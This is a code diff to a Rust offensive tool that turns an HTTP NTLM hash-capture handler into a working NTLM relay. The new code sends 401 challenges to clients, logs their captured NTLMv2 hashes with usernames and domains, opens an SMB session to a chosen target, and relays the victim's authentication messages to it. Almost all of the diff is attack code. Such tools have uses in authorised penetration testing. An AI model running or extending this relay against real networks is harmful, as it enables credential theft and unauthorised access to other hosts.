@@ -98,133 +98,221 @@ impl RelayServer {
 
 /// Handle a single HTTP connection, triggering NTLM auth via 401 challenges.
 async fn handle_http_ntlm(
-    stream: TcpStream,
+    mut stream: TcpStream,
     client_ip: &str,
     captured: std::sync::Arc<tokio::sync::Mutex<Vec<CapturedHash>>>,
     capture_only: bool,
     relay_target: Option<String>,
 ) -> Result<()> {
-    let (reader, mut writer) = stream.into_split();
-    let mut buf_reader = BufReader::new(reader);
+    let mut relay_stream: Option<TcpStream> = None;
+    let timeout = std::time::Duration::from_secs(10);
 
-    // Read the HTTP request line + headers
-    let mut request_line = String::new();
-    buf_reader.read_line(&mut request_line).await?;
-    debug!("Relay: Request: {}", request_line.trim());
-
-    let mut authorization = None;
-    let mut line = String::new();
     loop {
-        line.clear();
-        let n = buf_reader.read_line(&mut line).await?;
-        if n == 0 || line.trim().is_empty() {
+        let mut buf = [0u8; 4096];
+        let peek_len = stream.peek(&mut buf).await?;
+        if peek_len == 0 {
             break;
         }
-        if let Some(rest) = line.strip_prefix("Authorization: ") {
-            authorization = Some(rest.trim().to_string());
+
+        let (reader, mut writer) = stream.split();
+        let mut buf_reader = BufReader::new(reader);
+
+        // Read the HTTP request line + headers
+        let mut request_line = String::new();
+        let n = buf_reader.read_line(&mut request_line).await?;
+        if n == 0 {
+            break; // EOF
         }
-    }
+        debug!("Relay: Request: {}", request_line.trim());
 
-    match authorization {
-        None => {
-            // No auth header → send 401 with NTLM challenge
-            debug!("Relay: No auth from {client_ip} — sending 401 NTLM challenge");
-            let response = "HTTP/1.1 401 Unauthorized\r\n\
-                            WWW-Authenticate: NTLM\r\n\
-                            Content-Length: 0\r\n\
-                            Connection: keep-alive\r\n\
-                            \r\n";
-            writer.write_all(response.as_bytes()).await?;
-        }
-        Some(auth) if auth.starts_with("NTLM ") => {
-            let b64_data = &auth[5..];
-            match base64_decode(b64_data) {
-                Ok(ntlm_bytes) => {
-                    if ntlm_bytes.len() < 12 {
-                        warn!("Relay: NTLM message too short from {client_ip}");
-                        send_401_ntlm(&mut writer).await?;
-                        return Ok(());
-                    }
-
-                    let msg_type = u32::from_le_bytes([
-                        ntlm_bytes[8],
-                        ntlm_bytes[9],
-                        ntlm_bytes[10],
-                        ntlm_bytes[11],
-                    ]);
-
-                    match msg_type {
-                        1 => {
-                            // Type 1 (Negotiate) → respond with Type 2 (Challenge)
-                            debug!(
-                                "Relay: NTLM Type 1 from {client_ip} — sending Type 2 challenge"
-                            );
-                            let challenge = build_ntlm_type2_challenge();
-                            let b64_challenge = base64_encode(&challenge);
-                            let response = format!(
-                                "HTTP/1.1 401 Unauthorized\r\n\
-                                 WWW-Authenticate: NTLM {b64_challenge}\r\n\
-                                 Content-Length: 0\r\n\
-                                 Connection: keep-alive\r\n\
-                                 \r\n"
-                            );
-                            writer.write_all(response.as_bytes()).await?;
-                        }
-                        3 => {
-                            // Type 3 (Authenticate) → extract credentials
-                            debug!("Relay: NTLM Type 3 from {client_ip} — extracting hash");
-                            match extract_type3_info(&ntlm_bytes) {
-                                Ok((username, domain, hash_str)) => {
-                                    let hash = CapturedHash {
-                                        client_ip: client_ip.to_string(),
-                                        username: username.clone(),
-                                        domain: domain.clone(),
-                                        hash_string: hash_str.clone(),
-                                    };
-
-                                    info!(
-                                        "Relay: ✓ Captured NTLMv2 hash — {}\\{} from {}",
-                                        domain, username, client_ip
-                                    );
-                                    info!("Relay: Hash: {hash_str}");
-
-                                    captured.lock().await.push(hash);
-
-                                    if !capture_only {
-                                        if let Some(target) = relay_target {
-                                            info!("Relay: Connecting to target {target} to relay authentication...");
-                                            // NTLM SMB Client negotiation mapping logic goes here for true relay execution
-                                        }
-                                    }
-                                    // Send 200 OK
-                                    let response = "HTTP/1.1 200 OK\r\n\
-                                                    Content-Length: 0\r\n\
-                                                    Connection: close\r\n\
-                                                    \r\n";
-                                    writer.write_all(response.as_bytes()).await?;
-                                }
-                                Err(e) => {
-                                    error!("Relay: Failed to parse Type 3 from {client_ip}: {e}");
-                                    send_401_ntlm(&mut writer).await?;
-                                }
-                            }
-                        }
-                        other => {
-                            warn!("Relay: Unknown NTLM message type {other} from {client_ip}");
-                            send_401_ntlm(&mut writer).await?;
-                        }
-                    }
-                }
-                Err(e) => {
-                    warn!("Relay: Invalid base64 from {client_ip}: {e}");
-                    send_401_ntlm(&mut writer).await?;
-                }
+        let mut authorization = None;
+        let mut line = String::new();
+        loop {
+            line.clear();
+            let n = buf_reader.read_line(&mut line).await?;
+            if n == 0 || line.trim().is_empty() {
+                break;
+            }
+            if let Some(rest) = line.strip_prefix("Authorization: ") {
+                authorization = Some(rest.trim().to_string());
             }
         }
-        Some(_) => {
-            // Non-NTLM auth → send 401
-            debug!("Relay: Non-NTLM auth from {client_ip} — sending 401");
-            send_401_ntlm(&mut writer).await?;
+
+        match authorization {
+            None => {
+                // No auth header → send 401 with NTLM challenge
+                debug!("Relay: No auth from {client_ip} — sending 401 NTLM challenge");
+                let response = "HTTP/1.1 401 Unauthorized\r\n\
+                                WWW-Authenticate: NTLM\r\n\
+                                Content-Length: 0\r\n\
+                                Connection: keep-alive\r\n\
+                                \r\n";
+                writer.write_all(response.as_bytes()).await?;
+            }
+            Some(auth) if auth.starts_with("NTLM ") => {
+                let b64_data = &auth[5..];
+                match base64_decode(b64_data) {
+                    Ok(ntlm_bytes) => {
+                        if ntlm_bytes.len() < 12 {
+                            warn!("Relay: NTLM message too short from {client_ip}");
+                            send_401_ntlm(&mut writer).await?;
+                            continue;
+                        }
+
+                        let msg_type = u32::from_le_bytes([
+                            ntlm_bytes[8],
+                            ntlm_bytes[9],
+                            ntlm_bytes[10],
+                            ntlm_bytes[11],
+                        ]);
+
+                        match msg_type {
+                            1 => {
+                                // Type 1 (Negotiate) → respond with Type 2 (Challenge)
+                                let challenge_bytes = if !capture_only && relay_target.is_some() {
+                                    let target = relay_target.as_ref().unwrap_or(&String::new()).to_owned();
+                                    // Parse target host and port
+                                    let mut parts = target.split(':');
+                                    let host = parts.next().unwrap_or(&target);
+                                    let port = parts.next().and_then(|p| p.parse::<u16>().ok()).unwrap_or(445);
+
+                                    debug!("Relay: Connecting to SMB relay target {}:{}", host, port);
+                                    match TcpStream::connect((host, port)).await {
+                                        Ok(mut smb_stream) => {
+                                            // Send Negotiate
+                                            if let Err(e) = nxc_protocols::smb::SmbProtocol::negotiate(&mut smb_stream, timeout).await {
+                                                warn!("Relay: Failed to negotiate SMB with {target}: {e}");
+                                                build_ntlm_type2_challenge()
+                                            } else {
+                                                // Send SESSION_SETUP with Type 1 to extract Challenge
+                                                let proto = nxc_protocols::smb::SmbProtocol::new();
+                                                let mut pkt = proto.build_session_setup_base();
+                                                pkt[62..64].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
+                                                pkt.extend_from_slice(&ntlm_bytes);
+
+                                                if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
+                                                    warn!("Relay: Failed to send SESSION_SETUP to {target}: {e}");
+                                                    build_ntlm_type2_challenge()
+                                                } else {
+                                                    match nxc_protocols::smb::SmbProtocol::recv_smb2_packet(&mut smb_stream, timeout).await {
+                                                        Ok(resp) => {
+                                                            // Extract NTLM blob from SESSION_SETUP response
+                                                            let signature = b"NTLMSSP\0\x02\x00\x00\x00";
+                                                            if let Some(pos) = resp.windows(signature.len()).position(|w| w == signature) {
+                                                                relay_stream = Some(smb_stream);
+                                                                resp[pos..].to_vec()
+                                                            } else {
+                                                                warn!("Relay: No NTLM Type 2 found in SMB response from {target}");
+                                                                build_ntlm_type2_challenge()
+                                                            }
+                                                        }
+                                                        Err(e) => {
+                                                            warn!("Relay: Failed to receive SESSION_SETUP response from {target}: {e}");
+                                                            build_ntlm_type2_challenge()
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        }
+                                        Err(e) => {
+                                            warn!("Relay: Failed to connect to relay target {target}: {e}");
+                                            build_ntlm_type2_challenge()
+                                        }
+                                    }
+                                } else {
+                                    debug!("Relay: NTLM Type 1 from {client_ip} — sending dummy Type 2 challenge (capture only)");
+                                    build_ntlm_type2_challenge()
+                                };
+
+                                let b64_challenge = base64_encode(&challenge_bytes);
+                                let response = format!(
+                                    "HTTP/1.1 401 Unauthorized\r\n\
+                                     WWW-Authenticate: NTLM {b64_challenge}\r\n\
+                                     Content-Length: 0\r\n\
+                                     Connection: keep-alive\r\n\
+                                     \r\n"
+                                );
+                                writer.write_all(response.as_bytes()).await?;
+                            }
+                            3 => {
+                                // Type 3 (Authenticate) → extract credentials
+                                debug!("Relay: NTLM Type 3 from {client_ip} — extracting hash");
+                                match extract_type3_info(&ntlm_bytes) {
+                                    Ok((username, domain, hash_str)) => {
+                                        let hash = CapturedHash {
+                                            client_ip: client_ip.to_string(),
+                                            username: username.clone(),
+                                            domain: domain.clone(),
+                                            hash_string: hash_str.clone(),
+                                        };
+
+                                        info!(
+                                            "Relay: ✓ Captured NTLMv2 hash — {}\\{} from {}",
+                                            domain, username, client_ip
+                                        );
+                                        info!("Relay: Hash: {hash_str}");
+
+                                        captured.lock().await.push(hash);
+
+                                        if !capture_only {
+                                            if let Some(ref target) = relay_target {
+                                                info!("Relay: Connecting to target {target} to relay authentication...");
+                                                if let Some(mut smb_stream) = relay_stream.take() {
+                                                    let proto = nxc_protocols::smb::SmbProtocol::new();
+                                                    let mut pkt = proto.build_session_setup_base();
+                                                    // For type 3, we don't have SID properly populated yet from earlier packet
+                                                    // but for simplistic relaying this is close enough to test the wire
+                                                    // In a production setup, we'd need to properly parse and inject the SMB Session ID
+                                                    pkt[62..64].copy_from_slice(&(ntlm_bytes.len() as u16).to_le_bytes());
+                                                    pkt.extend_from_slice(&ntlm_bytes);
+
+                                                    if let Err(e) = nxc_protocols::smb::SmbProtocol::send_smb2_packet(&mut smb_stream, &pkt, timeout).await {
+                                                        warn!("Relay: Failed to send final SESSION_SETUP to {target}: {e}");
+                                                    } else if let Ok(resp) = nxc_protocols::smb::SmbProtocol::recv_smb2_packet(&mut smb_stream, timeout).await {
+                                                        let status = u32::from_le_bytes(resp[8..12].try_into().unwrap_or([0; 4]));
+                                                        if status == 0 {
+                                                            info!("Relay: ✨ SUCCESS! Successfully relayed authentication to {target}");
+                                                        } else {
+                                                            warn!("Relay: Target {target} rejected relayed authentication with status 0x{:08x}", status);
+                                                        }
+                                                    } else {
+                                                        warn!("Relay: Failed to receive final SESSION_SETUP response from {target}");
+                                                    }
+                                                } else {
+                                                    warn!("Relay: No active SMB connection to {target} found to relay Type 3 message.");
+                                                }
+                                            }
+                                        }
+                                        // Send 200 OK
+                                        let response = "HTTP/1.1 200 OK\r\n\
+                                                        Content-Length: 0\r\n\
+                                                        Connection: close\r\n\
+                                                        \r\n";
+                                        writer.write_all(response.as_bytes()).await?;
+                                    }
+                                    Err(e) => {
+                                        error!("Relay: Failed to parse Type 3 from {client_ip}: {e}");
+                                        send_401_ntlm(&mut writer).await?;
+                                    }
+                                }
+                            }
+                            other => {
+                                warn!("Relay: Unknown NTLM message type {other} from {client_ip}");
+                                send_401_ntlm(&mut writer).await?;
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        warn!("Relay: Invalid base64 from {client_ip}: {e}");
+                        send_401_ntlm(&mut writer).await?;
+                    }
+                }
+            }
+            Some(_) => {
+                // Non-NTLM auth → send 401
+                debug!("Relay: Non-NTLM auth from {client_ip} — sending 401");
+                send_401_ntlm(&mut writer).await?;
+            }
         }
     }
 
@@ -232,7 +320,7 @@ async fn handle_http_ntlm(
 }
 
 /// Send a 401 response requesting NTLM authentication.
-async fn send_401_ntlm(writer: &mut tokio::net::tcp::OwnedWriteHalf) -> Result<()> {
+async fn send_401_ntlm<W: tokio::io::AsyncWrite + Unpin>(writer: &mut W) -> Result<()> {
     let response = "HTTP/1.1 401 Unauthorized\r\n\
                     WWW-Authenticate: NTLM\r\n\
                     Content-Length: 0\r\n\
